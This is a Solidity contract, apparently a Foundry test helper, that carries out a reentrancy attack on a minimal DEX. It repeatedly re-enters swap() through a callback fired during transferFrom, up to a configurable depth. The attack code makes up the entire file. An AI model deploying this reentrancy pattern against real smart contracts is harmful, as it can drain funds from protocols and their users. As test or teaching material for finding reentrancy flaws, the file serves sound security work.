// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {ERC20} from "../../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {console} from "../../../lib/forge-std/src/console.sol";

interface IMinimalDex {
    function swap(uint256, uint256, string memory, string memory) external;
}

contract ReentrancyAttacker {
    string private tokenIn;
    string private tokenOut;
    uint256 private amountIn;
    IMinimalDex public immutable dex;
    uint256 public entranceCount;
    uint256 public maxEntranceCount = 4;

    /// @dev Constructor to initialize the attacker with the target DEX and reentrancy depth.
    constructor(address _dex, uint256 _maxEntranceCount) {
        maxEntranceCount = _maxEntranceCount;
        entranceCount = 0;
        dex = IMinimalDex(_dex);
    }

    /// @dev Starts the reentrancy attack by calling `swap` on the target DEX.
    /// Saves swap parameters and sets up for future reentries.
    function attack(string memory _tokenIn, string memory _tokenOut, uint256 _amountIn) external {
        amountIn = _amountIn;
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
        entranceCount = 1;
        // console.log("Attacking for .... ", tokenIn, tokenOut, amountIn);
        dex.swap(amountIn, 0, tokenIn, tokenOut);
    }

    /// @dev This function is called from inside `transferFrom()` during the DEX's swap logic.
    /// It recursively calls `swap` again to exploit reentrancy if the maximum depth has not been reached.
    function reenter() external {
        if (++entranceCount > maxEntranceCount) {
            return;
        }
        dex.swap(amountIn, 0, tokenIn, tokenOut);
    }
}
